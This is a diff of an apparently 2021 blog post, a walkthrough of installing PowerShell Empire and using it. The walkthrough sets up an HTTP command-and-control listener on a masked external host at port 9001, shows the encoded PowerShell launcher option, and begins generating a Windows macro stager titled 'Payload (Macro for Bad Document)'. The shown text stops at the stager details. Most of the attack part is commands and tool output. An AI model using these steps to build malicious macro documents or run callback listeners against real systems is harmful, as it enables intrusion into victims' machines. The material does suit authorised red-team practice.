@@ -8,15 +8,15 @@
 Friday, Apr 2, 2021
 | 2 minutes read
 | Update at
-Friday, Apr 2, 2021</div></h1></header><article class=main><h1 id=prereq>Prereq</h1><h2 id=install-pip3-python-package-installer>install pip3 (python Package installer)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install python3-pip -y 
+Friday, Apr 2, 2021</div></h1></header><article class=main><h1 id=prereq>Prereq</h1><h2 id=install-pip3-python-package-installer>install pip3 (python Package installer)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install python3-pip -y 
 </span></span></code></pre></div><h2 id=install-poetry>Install Poetry</h2><pre tabindex=0><code>sudo pip3 install poetry
-</code></pre><h2 id=install-git>install Git</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install git -y 
-</span></span></code></pre></div><h2 id=install-powershell---empire>Install Powershell - Empire</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone --recursive https://github.com/BC-SECURITY/Empire.git
+</code></pre><h2 id=install-git>install Git</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install git -y 
+</span></span></code></pre></div><h2 id=install-powershell---empire>Install Powershell - Empire</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>git clone --recursive https://github.com/BC-SECURITY/Empire.git
 </span></span><span style=display:flex><span>cd Empire
 </span></span><span style=display:flex><span>sudo ./setup/install.sh
 </span></span><span style=display:flex><span>sudo poetry install
 </span></span><span style=display:flex><span>sudo poetry run python empire
-</span></span></code></pre></div><hr><h1 id=hacking>Hacking</h1><h2 id=generate-a-listener-http>generate a listener (http)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire<span style=color:#f92672>)</span> &gt; uselistener http
+</span></span></code></pre></div><hr><h1 id=hacking>Hacking</h1><h2 id=generate-a-listener-http>generate a listener (http)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire<span style=color:#f92672>)</span> &gt; uselistener http
 </span></span><span style=display:flex><span><span style=color:#f92672>(</span>Empire: listeners/http<span style=color:#f92672>)</span> &gt; info
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>    Name: HTTP<span style=color:#f92672>[</span>S<span style=color:#f92672>]</span>
@@ -39,9 +39,9 @@ Friday, Apr 2, 2021</div></h1></header><article class=main><h1 id=prereq>Prereq<
 </span></span><span style=display:flex><span>  Port              True                                         Port <span style=color:#66d9ef>for</span> the listener.
 </span></span><span style=display:flex><span>  Launcher          True        powershell -noP -sta -w <span style=color:#ae81ff>1</span> -enc   Launcher string.
 </span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
-</span></span></code></pre></div><p>change the IP & port</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire: listeners/http<span style=color:#f92672>)</span> &gt; set Host 34.xx.xx.xx
+</span></span></code></pre></div><p>change the IP & port</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire: listeners/http<span style=color:#f92672>)</span> &gt; set Host 34.xx.xx.xx
 </span></span><span style=display:flex><span><span style=color:#f92672>(</span>Empire: listeners/http<span style=color:#f92672>)</span> &gt; set Port <span style=color:#ae81ff>9001</span>
-</span></span></code></pre></div><p>finally execute to start listening</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire: listeners/http<span style=color:#f92672>)</span> &gt; execute
+</span></span></code></pre></div><p>finally execute to start listening</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire: listeners/http<span style=color:#f92672>)</span> &gt; execute
 </span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting listener <span style=color:#e6db74>&#39;http&#39;</span>
 </span></span><span style=display:flex><span> * Serving Flask app <span style=color:#e6db74>&#34;http&#34;</span> <span style=color:#f92672>(</span>lazy loading<span style=color:#f92672>)</span>
 </span></span><span style=display:flex><span> * Environment: production
@@ -49,7 +49,7 @@ Friday, Apr 2, 2021</div></h1></header><article class=main><h1 id=prereq>Prereq<
 </span></span><span style=display:flex><span>   Use a production WSGI server instead.
 </span></span><span style=display:flex><span> * Debug mode: off
 </span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Listener successfully started!
-</span></span></code></pre></div><h2 id=payload-macro-for-bad-document>Payload (Macro for Bad Document)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire<span style=color:#f92672>)</span> &gt; usestager windows/macro
+</span></span></code></pre></div><h2 id=payload-macro-for-bad-document>Payload (Macro for Bad Document)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Empire<span style=color:#f92672>)</span> &gt; usestager windows/macro
 </span></span><span style=display:flex><span><span style=color:#f92672>(</span>Empire: stager/windows/macro<span style=color:#f92672>)</span> &gt; info
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Name: Macro
